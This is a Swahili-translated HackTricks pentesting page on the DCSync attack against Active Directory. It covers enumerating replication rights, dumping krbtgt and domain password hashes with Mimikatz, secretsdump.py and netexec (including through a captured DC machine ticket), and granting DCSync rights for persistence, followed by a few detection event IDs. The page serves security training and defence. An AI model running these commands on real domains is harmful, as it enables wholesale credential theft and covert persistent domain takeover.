# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Ruhusa ya **DCSync** inaashiria kuwa na ruhusa hizi kwenye domain yenyewe: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** na **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Maelezo Muhimu kuhusu DCSync:**

- **Shambulio la DCSync huiga tabia ya Domain Controller na kuwaomba Domain Controller wengine warudie taarifa** kwa kutumia Directory Replication Service Remote Protocol (MS-DRSR). Kwa kuwa MS-DRSR ni utendaji halali na muhimu wa Active Directory, haiwezi kuzimwa au kulemazwa.
- Kwa chaguomsingi, ni makundi ya **Domain Admins, Enterprise Admins, Administrators, na Domain Controllers** pekee yaliyo na ruhusa zinazohitajika.
- Kwa vitendo, **DCSync kamili** inahitaji **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** kwenye muktadha wa majina ya domain. `DS-Replication-Get-Changes-In-Filtered-Set` mara nyingi hukabidhiwa pamoja na ruhusa hizo, lakini peke yake inahusika zaidi na kusawazisha **sifa za siri / zilizochujwa na RODC** (kwa mfano siri za zamani za mtindo wa LAPS) kuliko kutoa dump kamili ya krbtgt.<sup>[[2]](#references)</sup>
- Ikiwa nywila za akaunti zozote zimehifadhiwa kwa usimbaji fiche unaoweza kubadilishwa, Mimikatz ina chaguo la kuonyesha nywila hiyo kama maandishi yaliyo wazi

### Enumeration

Angalia ni nani aliye na ruhusa hizi ukitumia `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Ikiwa unataka kuangazia **principal zisizo za default** zilizo na haki za DCSync, chuja vikundi vilivyojengewa ndani vinavyoweza kufanya replication na ukague trustees zisizotarajiwa:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Tumia exploit ndani ya mfumo

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit kwa Mbali

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Mifano ya vitendo yenye wigo maalum:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync kwa kutumia TGT ya mashine ya DC iliyonaswa (ccache)

Unapokagua huduma kwenye domain controller, tofautisha utambulisho wake wa huduma wa ndani na utambulisho wake wa mtandao. [Microsoft inaeleza](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) kwamba akaunti pepe za SQL Server (`NT SERVICE\...`) hutumia akaunti ya kompyuta mwenyeji kufikia rasilimali za mtandao. Kwenye domain controller, hali hii inaweza kufanya akaunti ya mashine ya DC ihusike katika ukaguzi wa haki za replication, lakini kupata ufikiaji kupitia huduma pekee hakuthibitishi kuwa kuna machine TGT inayoweza ku-exportiwa au uthibitishaji wa DCSync unaoweza kutumika. Thibitisha utambulisho halisi wa huduma, muktadha wa uthibitishaji wa nje, tiketi au credentials zinazopatikana, na haki halisi za replication kabla ya kuchukulia hili kama njia.

Katika hali za export-mode za unconstrained delegation, unaweza kunasa machine TGT ya Domain Controller (kwa mfano, `DC1$@DOMAIN` kwa `krbtgt@DOMAIN`). Kisha unaweza kutumia ccache hiyo kuthibitisha kama DC na kutekeleza DCSync bila nenosiri.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Vidokezo vya kiutendaji:

- **Njia ya Kerberos ya Impacket hutumia SMB kwanza** kabla ya mwito wa DRSUAPI. Ikiwa mazingira yanatekeleza **uthibitishaji wa jina la SPN lengwa**, full dump inaweza kushindwa kwa sababu ya `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Katika hali hiyo, ama omba tiketi ya huduma ya **`cifs/<dc>`** ya DC lengwa kwanza au tumia **`-just-dc-user`** kwa akaunti unayohitaji mara moja.
- Ukiwa na haki za chini za replication pekee, ulandanishaji wa mtindo wa LDAP/DirSync bado unaweza kufichua sifa za **confidential** au **RODC-filtered** (kwa mfano `ms-Mcs-AdmPwd` ya zamani) bila replication kamili ya krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` hutengeneza faili 3:

- moja yenye **NTLM hashes**
- moja yenye **Kerberos keys**
- moja yenye nywila za cleartext kutoka NTDS za akaunti zozote zilizowekwa kuwasha [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Unaweza kupata watumiaji walio na reversible encryption kwa kutumia

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Ikiwa wewe ni domain admin, unaweza kumpa mtumiaji yeyote ruhusa hizi kwa kutumia PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Waendeshaji wa Linux wanaweza kufanya vivyo hivyo kwa kutumia `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Kisha, unaweza **kuangalia ikiwa mtumiaji alipewa kwa usahihi** ruhusa hizo 3 kwa kuzitafuta kwenye matokeo ya (unapaswa kuona majina ya ruhusa hizo ndani ya sehemu ya "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Upunguzaji wa Hatari

- Security Event ID 4662 (Sera ya ukaguzi kwa object lazima iwezeshwe) – Operesheni ilifanywa kwenye object<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Sera ya ukaguzi kwa object lazima iwezeshwe) – Object ya huduma ya saraka ilirekebishwa
- Security Event ID 4670 (Sera ya ukaguzi kwa object lazima iwezeshwe) – Ruhusa kwenye object zilibadilishwa
- AD ACL Scanner - Tengeneza na ulinganishe ripoti za ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Kumbukumbu ya Mabadiliko ya Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Kutumia Replication Get-Changes na Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Toa Hash za Nenosiri kutoka kwa Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — Hati za siri za SYSVOL → Kerberoast Inayolengwa → Unconstrained Delegation → DCSync hadi DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
